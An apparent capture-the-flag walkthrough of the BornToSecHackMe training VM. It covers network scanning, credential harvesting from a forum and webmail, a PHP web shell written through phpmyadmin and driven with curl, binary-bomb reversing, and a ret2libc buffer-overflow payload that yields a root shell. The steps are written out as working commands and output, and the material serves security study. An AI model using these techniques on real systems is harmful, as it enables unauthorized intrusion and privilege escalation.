## I - Find the IP

````bash
$>ifconfig
…
en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	options=400<CHANNEL_IO>
	ether 14:7d:da:39:fa:4c
	inet6 fe80::89e:d84e:b458:2477%en0 prefixlen 64 secured scopeid 0x6
	inet 192.168.1.85 netmask 0xffffff00 broadcast 192.168.1.255
	nd6 options=201<PERFORMNUD,DAD>
	media: autoselect
	status: active
….


$>nmap 192.168.1.0-255
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-18 15:54 CEST
Nmap scan report for box (192.168.1.1)
Host is up (0.0023s latency).
Not shown: 996 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
1287/tcp  open  routematch
49152/tcp open  unknown

Nmap scan report for BornToSecHackMe (192.168.1.58)
Host is up (0.00059s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap scan report for Relkondos-MBP (192.168.1.85)
Host is up (0.000088s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
6881/tcp open  bittorrent-tracker

Nmap done: 256 IP addresses (3 hosts up) scanned in 65.27 seconds
````


=> The IP is 192.168.1.58



## II. Exploring with dirb

Intalling dirb => 
````bash
$>cd ~/Applications
wget https://downloads.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz
tar -xvf dirb222.tar.gz
rm dirb222.tar.gz
brew install autoconf
chmod -R 755 dirb222
cd dirb222
./configure
make
make install
````

Then =>

````
$>dirb https://192.168.1.58 ~/Applications/dirb222/wordlists/common.txt

-----------------
DIRB v2.22
By The Dark Raver

-----------------

START_TIME: Tue May 18 17:44:47 2021
URL_BASE: https://192.168.1.58/
WORDLIST_FILES: /Users/relkondo/Applications/dirb222/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.1.58/ ----
+ https://192.168.1.58/cgi-bin/ (CODE:403|SIZE:289)
==> DIRECTORY: https://192.168.1.58/forum/
==> DIRECTORY: https://192.168.1.58/phpmyadmin/
+ https://192.168.1.58/server-status (CODE:403|SIZE:294)
==> DIRECTORY: https://192.168.1.58/webmail/

[…]
````



## III. Successive intrusions

Going into https://192.168.1.58/forum/, we find 
````
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
````
in
“Probleme login ? by lmezard” page.

We connect with it to the forum. Going into mlezard profile (https://192.168.1.58/forum/index.php?mode=user&action=edit_profile), we find his email to be laurie@borntosec.net.

=> connect to https://192.168.1.58/webmail/

````
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
````

=> connect to phpmyadmin



## IV. Injection

In phpmyadmin :

````
SELECT "<?php system($_GET['cmd’].’ 2>&1’) ?>" INTO OUTFILE "/var/www/forum/templates_c/exploit.php"
````

````bash
$> curl -k 'https://192.168.1.58/forum/templates_c/exploit.php?cmd=pwd'
/var/www/forum/templates_c

=> -k = —insecure
=> injection was successful

curl -k 'https://192.168.1.58/forum/templates_c/exploit.php?cmd=ls%20/home’
LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz

curl -k 'https://192.168.1.58/forum/templates_c/exploit.php?cmd=ls%20/home/LOOKATME’
password

curl -k 'https://192.168.1.58/forum/templates_c/exploit.php?cmd=cat%20/home/LOOKATME/password’
lmezard:G!@M6f4Eatau{sF"
````



## V. Get files through FTP

It’s not an ssh password. We look for open services  with nmap with version detection:

````bash
$> nmap 192.168.1.58

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 22:37 CEST
Nmap scan report for BornToSecHackMe (192.168.1.58)
Host is up (0.00018s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

$> brew install inetutils

$> ftp lmezard@192.168.1.58
Connected to 192.168.1.58.
220 Welcome on this server
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get README
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for README (96 bytes).
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
96 bytes received in 0.000154 seconds (609 kbytes/s)
ftp> get fun
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fun (808960 bytes).
WARNING! 2764 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
808960 bytes received in 0.0765 seconds (10.1 Mbytes/s)
ftp> !ls
README	fun
ftp> bye
221 Goodbye.

$> file fun
fun: POSIX tar archive (GNU)

$> mv fun fun.tar
$> tar -xf fun.tar
````

=> We find the content to be lines of code with a file number. We concatenate into a .c file using a python script (see read_fun.py), compile and execute it :
````
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%
````

=> SHA-256 : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

````
$>  ssh laurie@192.168.1.58
````



## VI. The bomb

using ghidra

Phase_1 just checks if answer is 
Public speaking is very easy.

Phase_2 check if answer is a set of 6 numbers equal to k! for k = [1..6]
1 2 6 24 120 720

Phase_3 has 6 answer possible depending of the first number
0 q 777 OR 1 b 214 OR 2 b 755…
Based on hint : 1 b 214

Phase_4 is expecting the Fibonacci number (minus one) that gives 55
9

Phase_5 is requiring us to input a string where the ASCII code (modulo 16) of each character are used to find the spot in “isrveawhobpnutfg” in order to write “giants”
“giants” in “isrveawhobpnutfg” =  characters number 15, 0, 5, 11, 13, 1, so :
?05;=1 OR O@EKMA OR opukmq OR opekmq
Based on hint : opekmq

Phase_6 expect 6 different numbers. It’s ordering a chain of nodes based on our inpt, then check if the vales of the nodes are decreasing. We should input the order by decreasing values.

(gdb) p node1
$1 = 253
(gdb) p node2
$2 = 725
(gdb) p node3
$3 = 301
(gdb) p node4
$4 = 997
(gdb) p node5
$5 = 212
(gdb) p node6
$6 = 432

=> 4 2 6 3 1 5

Final password :
Publicspeakingisveryeasy.126241207201b2149opekmq426135
Note : there’s a mistake in it, it ends with 135 instead of 315.



## VII. Thor
Instructions are based on the python turtle game, used to teach coding to children.
````bash
($ virtualenv v_turtle)
$ source v_turtle/bin/activate
($ pip install turtle)
($ sudo apt-get install python-tk)
$ python3 scripts/solve_turtle.py
````

=> SLASH
Can you digest the message ? => this means we got to md5 the password 
=> 646da671ca01bb5d84dbb5fb2238dc8e



## VIII. Zaz

Check if ASLR protection (address space layout randomization, a protection that triggers use of random memory address for each binary execution) is deactivated :
````bash
cat /proc/sys/kernel/randomize_va_space
0
````

Also, there’s no checksec, but otherwise would be good to do a checksec --file=exploit_me 
````bash
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:	    push   ebp
   0x080483f5 <+1>:	    mov    ebp,esp
   0x080483f7 <+3>:	    and    esp,0xfffffff0
   0x080483fa <+6>:	    sub    esp,0x90
   0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    eax,0x1
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048410 <+28>:	add    eax,0x4
   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
   0x08048419 <+37>:	lea    eax,[esp+0x10]
   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    eax,[esp+0x10]
   0x08048429 <+53>:	mov    DWORD PTR [esp],eax
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    eax,0x0
   0x08048436 <+66>:	leave  
   0x08048437 <+67>:	ret    
End of assembler dump.
````

There’ s a strcpy. Maybe we can overflow and do a return-to-libc attack ?

````bash
./exploit_me $(perl -e 'print “DEVIL”x666')
````

Works, segfault. We can’t install peda and do a pattern search, so we find the 140 char limit through trial and error.
We find the address of system, exit, /bin/sh : 

````bash
zaz@BornToSecHackMe:~$ gdb exploit_me
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.

$(gdb) b *main
Breakpoint 1 at 0x80483f4

$(gdb) r WHATEVER

$(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system
0xb7f49550  svcerr_systemerr


$(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xb7e5ebe0  exit
0xb7e5ec10  on_exit
0xb7e5ee20  __cxa_atexit
0xb7e5efc0  quick_exit
0xb7e5eff0  __cxa_at_quick_exit
0xb7ee41d8  _exit
0xb7f28500  pthread_exit
0xb7f2dc10  __cyg_profile_func_exit
0xb7f4c750  svc_exit
0xb7f56c80  atexit

$(gdb) info proc map
process 7577
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fdb000 0xb7fdd000     0x2000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
$(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58
1 pattern found.
````

=> 0xb7e6b060  system, 0xb7e5ebe0  exit, 0xb7f8cc58 /bin/sh

We overwrite the EIP register with the address of system
Next is the address where system should return at the end. We’ll put the address of exit. It should be noted that the exit() function is not very necessary for this attack; however, without this function, when system() returns, the program might crash, causing suspicions.
We push on the stack at [EIP + 8] the address of /bin/sh. 

````bash
$./exploit_me $(perl -e 'print "Z"x140, "\x60\xb0\xe6\xb7", "\xe0\xeb\xe5\xb7", "\x58\xcc\xf8\xb7"')
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ`�����X��
$ whoami
root
````

Trivia : ret2libc attack was first performed by Александр Песляк in 1997, the author of John the Ripper.
